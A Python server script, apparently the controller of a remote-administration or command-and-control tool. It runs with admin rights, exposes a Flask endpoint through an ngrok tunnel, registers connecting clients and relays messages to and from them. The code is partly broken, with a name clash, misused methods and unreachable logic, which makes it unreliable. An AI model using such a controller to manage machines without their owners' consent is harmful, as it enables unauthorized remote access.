from zlib import compress, decompress
from gui import start as start_gui
from threading import Thread
from datetime import datetime
from time import sleep
import config
import requests
import sys
from pyngrok import ngrok
import subprocess
import requests
import os
import time
from pyuac import main_requires_admin
from flask import Flask, request, jsonify

app = Flask(__name__)

SERVER_ADDRESS = None  # Define SERVER_ADDRESS as a global variable

class Server:
    client_connections = []
    def client_connections(self):
        """
        Accepts new client connections and adds them to the client list
        """
        while True:
            client, address = self.server.accept()
            config.log(f"Accepted a connection from {address[0]}:{address[1]}")
            self.client_connections.append(client)

    @app.route('/new_client', methods=['POST'])
    def new_client():
        """
        Adds a new client to the client list
        """
        client_data = request.json
        exist = False
        for client in config.client_list:
            if client['ip'] == client_data['ip']:
                exist = True
                break
        if not exist:
            config.client_list.append({'ip': client_data['ip'], 'data': client_data['data']})
        return jsonify({'status': 'success'})

    @app.route('/send', methods=['POST'])
    def send_message():
        """
        Sends a message to the server
        :param message: Message to send to the server (str)
        """
        global SERVER_ADDRESS  # Access the global variable
        message = request.json['message']
        url = f"{SERVER_ADDRESS}/send"
        data = {"message": message}
        response = requests.post(url, json=data)
        if response.status_code != 200:
            print(f"Failed to send message: {response.text}")
        return jsonify({'status': 'success'})

    @app.route('/receive', methods=['GET'])
    def receive_message():
        """
        Receives a message from the server
        :return: Message received from the server (str)
        """
        global SERVER_ADDRESS  # Access the global variable
        url = f"{SERVER_ADDRESS}/receive"
        response = requests.get(url)
        if response.status_code != 200:
            print(f"Failed to receive message: {response.text}")
            return jsonify({'status': 'failed'})
        return jsonify({'message': response.json()["message"]})

@main_requires_admin
def main():
    global SERVER_ADDRESS  # Access the global variable
    # Default Server Parameters
    ip = 'localhost'
    port = 8000

    # Change IP and Port according to the startup args
    for arg in sys.argv[1:]:
        if arg.startswith('--ip=') or arg.startswith('-i='):
            ip_arg = arg.split('=', maxsplit=1)[1]
            print(ip_arg)
            if ip_arg != '':
                ip = ip_arg
            else:
                config.log('Invalid ip address was inputted.')
        elif arg.startswith('--port=') or arg.startswith('-p='):
            try:
                port = int(arg.split('=', maxsplit=1)[1])
            except ValueError as e:
                config.log(str(e))
                config.log('Inputted port number is invalid. Starting on default port')

    try:
        # Start server
        # Step 0: Save the default path
        default_path = os.getcwd()
        print(default_path)
        # Step 1: cd into user's folder in Windows
        os.chdir(os.path.expanduser("~"))
        print("CD'd into user's folder in Windows")

        # Step 2: Start ngrok to expose the server to the internet
        ngrok_process = subprocess.Popen(["C:/Users/cyn0v/Documents/GitHub/Black-Opal/Resources/ngrok.exe", "http", "--host-header=rewrite", "8000"])
        print("Started ngrok to expose the server to the internet")
        time.sleep(2) # Give ngrok time to start up
        # Get the public URL from ngrok output
        public_url = requests.get("http://localhost:4040/api/tunnels").json()["tunnels"][0]["public_url"]
        config.log(f'Server is now publicly accessible at {public_url}')
        SERVER_ADDRESS = public_url  # Set the server address to the ngrok URL
        server = Server()
        server.server = app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
        Thread(target=server.client_connections, daemon=True).start()  # Thread to accept new connections
        start_gui()  # Start the GUI
    except requests.exceptions.RequestException as e:
        config.log(str(e))
        config.log('Invalid IP address to host server on.')
    except OverflowError as e:
        config.log(str(e))
        config.log('Invalid Port number to host server on.')

if __name__ == "__main__":
    main()